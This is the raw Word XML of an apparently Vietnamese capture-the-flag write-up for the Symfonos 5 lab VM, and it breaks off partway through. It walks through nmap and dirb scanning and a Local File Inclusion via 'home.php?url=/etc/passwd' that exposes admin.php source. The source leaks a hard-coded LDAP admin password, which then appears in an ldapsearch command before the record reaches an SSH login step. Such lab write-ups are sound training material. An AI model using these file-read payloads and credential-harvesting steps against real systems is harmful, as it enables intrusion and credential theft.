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7203" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SYMFONOS 5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30BCCE62" w14:textId="3572B03D" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">IP máy Symfonos 5: </w:t>
      </w:r>
      <w:r w:rsidR="00EA29FF">
        <w:t>192.168.56.119</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">IP máy Kali: </w:t>
      </w:r>
      <w:r>
        <w:t>192.168.56.105</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564651A7" w14:textId="5DFAE507" w:rsidR="00794677" w:rsidRPr="00EA29FF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Đường dẫn tải máy ảo và tài nguyên:</w:t>
      </w:r>
      <w:r w:rsidR="00EA29FF" w:rsidRPr="00EA29FF">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EA29FF" w:rsidRPr="00EA29FF">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>https://drive.google.com/drive/folders/1zxBk50_2vt5ifhvoCKHA7eSNTzd7f294</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B75B84" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Dò quét mạng và dịch vụ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F3ECDB7" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Xác định máy mục tiêu, cổng mở và dịch vụ web.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1766BB80" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B33E50E" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>netdiscover -i eth1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361BCA0A" w14:textId="77777777" w:rsidR="00EA29FF" w:rsidRDefault="00000000" w:rsidP="00EA29FF">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">nmap -A </w:t>
      </w:r>
      <w:r w:rsidR="00EA29FF">
        <w:t>192.168.56.119</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71090DDC" w14:textId="5F936F25" w:rsidR="00794677" w:rsidRDefault="00000000" w:rsidP="00EA29FF">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Netdiscover xác định IP trong mạng nội bộ. Nmap với -A thu thập thông tin hệ điều hành và dịch vụ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F7EC07" w14:textId="77777777" w:rsidR="00EA29FF" w:rsidRDefault="00EA29FF">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5544533F" wp14:editId="71C7962C">
            <wp:extent cx="6217920" cy="1439545"/>
            <wp:effectExtent l="0" t="0" r="0" b="8255"/>
            <wp:docPr id="42902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2593" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="1439545"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8A254D" w14:textId="4387B50A" w:rsidR="00EA29FF" w:rsidRPr="00EA29FF" w:rsidRDefault="00EA29FF" w:rsidP="00EA29FF">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="483929E8" wp14:editId="123B245A">
            <wp:extent cx="6217920" cy="3477260"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="39920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5379" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3477260"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B5AD7A2" w14:textId="2C788E4D" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Dò tìm thư mục và tệp PHP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="170F5924" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tìm đường dẫn ẩn và các trang PHP trên máy chủ web.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42DB7426" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0371457A" w14:textId="77777777" w:rsidR="00EA29FF" w:rsidRDefault="00EA29FF"/>
    <w:p w14:paraId="7803A6E0" w14:textId="48B37E65" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>dirb http://</w:t>
      </w:r>
      <w:r w:rsidR="00EA29FF">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>192.168.56.119</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="504C2781" w14:textId="730E5FB8" w:rsidR="00FA7951" w:rsidRDefault="00FA7951">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA7951">
        <w:t>dirb http://192.168.56.119 /usr/share/wordlists/dirb/big.txt -X .php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2852E14B" w14:textId="075800D7" w:rsidR="00794677" w:rsidRDefault="00794677"/>
    <w:p w14:paraId="5D5CCB1C" w14:textId="77777777" w:rsidR="00EA29FF" w:rsidRDefault="00EA29FF">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="652F45A0" wp14:editId="338680EB">
            <wp:extent cx="6217920" cy="3518535"/>
            <wp:effectExtent l="0" t="0" r="0" b="5715"/>
            <wp:docPr id="208248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87447" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3518535"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3709CFFB" w14:textId="4D6FA23C" w:rsidR="00EA29FF" w:rsidRPr="00EA29FF" w:rsidRDefault="00EA29FF" w:rsidP="00EA29FF">
      <w:r>
        <w:t>Truy cập vào đường dẫn http://192.168.56.119/admin.php.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E61D103" w14:textId="6D330E13" w:rsidR="00EA29FF" w:rsidRDefault="00EA29FF" w:rsidP="00EA29FF">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5AAFD1F5" wp14:editId="7E48E2EB">
            <wp:extent cx="6217920" cy="2580005"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="146898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80906" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2580005"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="513D8536" w14:textId="075B5BFA" w:rsidR="00FA7951" w:rsidRDefault="00FA7951" w:rsidP="00EA29FF">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="56E42A9C" wp14:editId="4AB3753A">
            <wp:extent cx="6217920" cy="2688590"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="38325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2082" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2688590"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="125F6B7C" w14:textId="739DE8FF" w:rsidR="00FA7951" w:rsidRDefault="00FA7951" w:rsidP="00EA29FF">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0C0082AA" wp14:editId="2A34E2DD">
            <wp:extent cx="6217920" cy="3276600"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="150266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61303" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId11"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3276600"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="17172847" w14:textId="7D2047C2" w:rsidR="00FA7951" w:rsidRPr="00EA29FF" w:rsidRDefault="00FA7951" w:rsidP="00EA29FF"/>
    <w:p w14:paraId="3CE61320" w14:textId="4A0C8525" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Kiểm tra tham số đọc tệp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="617878E8" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Đọc /etc/passwd và nội dung admin.php thông qua tham số url.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65C344A8" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F2DBBD9" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>/home.php?url=/etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="688C2D00" w14:textId="232947BF" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>/home.php?url=/</w:t>
      </w:r>
      <w:r w:rsidR="004B4059">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>var/www/html/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>admin.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64A7498A" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tham số url được sử dụng để yêu cầu home.php nạp tệp khác. Hai tệp trên có thể cung cấp danh sách người dùng và cấu hình LDAP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42C75A94" w14:textId="0353D480" w:rsidR="004B4059" w:rsidRDefault="004B4059">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="420BD724" wp14:editId="4948889F">
            <wp:extent cx="6217920" cy="3036570"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="26868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89514" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId12"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3036570"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="744173F4" w14:textId="77777777" w:rsidR="004B4059" w:rsidRDefault="004B4059">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="505AE718" wp14:editId="258EC43F">
            <wp:extent cx="6217920" cy="3423285"/>
            <wp:effectExtent l="0" t="0" r="0" b="5715"/>
            <wp:docPr id="191605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51406" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId13"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3423285"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A3E14CE" w14:textId="42529F95" w:rsidR="004B4059" w:rsidRDefault="004B4059" w:rsidP="004B4059">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="76C0FA8E" wp14:editId="74188A5A">
            <wp:extent cx="6217920" cy="3354070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="20928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39414" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId14"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3354070"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0180903B" w14:textId="11024E84" w:rsidR="004B4059" w:rsidRDefault="004B4059" w:rsidP="004B4059">
      <w:r w:rsidRPr="004B4059">
        <w:t>Sử dụng Burp Suite Repeater, tiến hành thay đổi tham số url của trang home.php thành /etc/passwd. Phản hồi từ máy chủ hiển thị nội dung tệp hệ thống, qua đó xác nhận tồn tại lỗ hổng Local File Inclusion. Tiếp tục khai thác bằng cách trỏ tham số url tới /var/www/html/admin.php, kết quả làm lộ mã nguồn PHP của ứng dụng. Qua phân tích mã nguồn, thu thập được địa chỉ máy chủ LDAP 172.18.0.22, tài khoản quản trị cn=</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004B4059">
        <w:t>admin,dc</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004B4059">
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004B4059">
        <w:t>symfonos,dc</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004B4059">
        <w:t xml:space="preserve">=local và mật khẩu được </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004B4059">
        <w:t>hard-code</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004B4059">
        <w:t xml:space="preserve"> trong mã nguồn. Điều này cho thấy lỗ hổng LFI không chỉ cho phép đọc tệp hệ thống mà còn có thể làm lộ thông tin xác thực nhạy cảm của ứng dụng.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19887B7B" w14:textId="75A89575" w:rsidR="004B4059" w:rsidRPr="004B4059" w:rsidRDefault="004B4059" w:rsidP="004B4059">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5F7A98B2" wp14:editId="3C5F77F5">
            <wp:extent cx="6217920" cy="4368800"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="178277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78831" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId15"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="4368800"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7464878D" w14:textId="2CB9F039" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Truy vấn LDAP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FB11F3D" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Thu thập tài khoản và thuộc tính trong cây thư mục symfonos.local.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="590845A5" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D64A6A8" w14:textId="24306631" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ldapsearch -h </w:t>
      </w:r>
      <w:r w:rsidR="00EA29FF">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>192.168.56.119</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p 389 -b "dc=</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>symfonos,dc</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>=local" -w 'qMDdyZh3cT6eeAWD' -D "cn=</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>admin,dc</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>symfonos,dc</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>=local"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="095A3B19" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Ldapsearch kết nối cổng 389, xác thực bằng tài khoản admin và truy vấn base DN của symfonos.local.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33AF1D56" w14:textId="77777777" w:rsidR="00C02D1A" w:rsidRDefault="00C02D1A">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0E6D9A6A" wp14:editId="52A1660A">
            <wp:extent cx="6217920" cy="3312795"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="7172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1280" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId16"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3312795"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="44DFEAFE" w14:textId="3CB20E43" w:rsidR="00C02D1A" w:rsidRPr="00C02D1A" w:rsidRDefault="00C02D1A" w:rsidP="00C02D1A">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="15D9F277" wp14:editId="7DF38B5C">
            <wp:extent cx="6217920" cy="2136140"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="98663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6812" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId17"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2136140"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D2C8893" w14:textId="14D46839" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Đăng nhập SSH và kiểm tra sudo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10805635" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Truy cập tài khoản zeus và xác định chương trình được chạy bằng sudo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2677EAD3" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="617863A3" w14:textId="3C83DABF" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ssh </w:t>
      </w:r>
      <w:hyperlink r:id="rId18" w:history="1">
        <w:r w:rsidR="000B050E" w:rsidRPr="00573E6B">
          <w:rPr>
